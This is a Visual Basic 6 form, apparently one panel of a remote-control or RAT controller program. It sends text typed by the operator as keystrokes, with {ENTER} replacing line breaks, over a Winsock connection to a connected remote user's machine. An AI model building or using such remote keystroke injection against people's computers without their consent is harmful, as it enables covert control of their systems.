VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Object = "{F8180939-60A2-4494-B1BB-04818D7F640B}#1.0#0"; "LabelDegradado.ocx"
Begin VB.Form fteclas 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Envio de teclas al usuario"
   ClientHeight    =   4815
   ClientLeft      =   8700
   ClientTop       =   6165
   ClientWidth     =   6495
   LinkTopic       =   "Form5"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4815
   ScaleWidth      =   6495
   ShowInTaskbar   =   0   'False
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   4680
      Top             =   4320
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   4080
      OleObjectBlob   =   "fteclas.frx":0000
      Top             =   4200
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Salir"
      Height          =   255
      Left            =   1440
      TabIndex        =   3
      Top             =   4440
      Width           =   1215
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Enviar"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   4440
      Width           =   1215
   End
   Begin VB.TextBox Text1 
      Height          =   3855
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   1
      Top             =   480
      Width           =   6255
   End
   Begin LabelDegradado.LabelDegrade LabelDegrade1 
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   6255
      _ExtentX        =   11033
      _ExtentY        =   450
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "&Teclas o texto a enviar al usuario"
      BackColor       =   255
      Transparente    =   0   'False
      ShadowDepth     =   0
      ShadowStyle     =   0
      ShadowColorStart=   0
      DegradadoColorStart=   8388608
   End
End
Attribute VB_Name = "fteclas"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function PathFileExists Lib "shlwapi" Alias "PathFileExistsA" (ByVal lppath As String) As Boolean

Dim vIndex As Variant
Dim Index_n As Integer

Private Sub Command1_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    If Not Text1 = "" Then
        Form1.Winsock1(vIndex(0)).SendData "key" & Replace(Text1.Text, vbCrLf, "{ENTER}") ' Reemplazamos los saltos de línea con {ENTER}'s.
        lista.List1.ListItems.Add , , " Enviando " & Text1.Text
        Text1.Text = ""
        Text1.SetFocus
    End If
Else
    Unload Me
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
End If
End Sub

Private Sub Command2_Click()
Unload Me
End Sub

Private Sub Form_Activate()
Text1.SetFocus
End Sub

Private Sub Form_Load()
Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")

If PathFileExists(App.path & "\sk\skin.skn") Then
    Skin1.LoadSkin App.path & "\sk\skin.skn"
    Skin1.ApplySkin fteclas.hwnd
End If
End Sub

Private Sub Timer1_Timer()

If Not Form1.Winsock1(vIndex(0)).state = sckConnected Then
    Unload Me
End If

End Sub
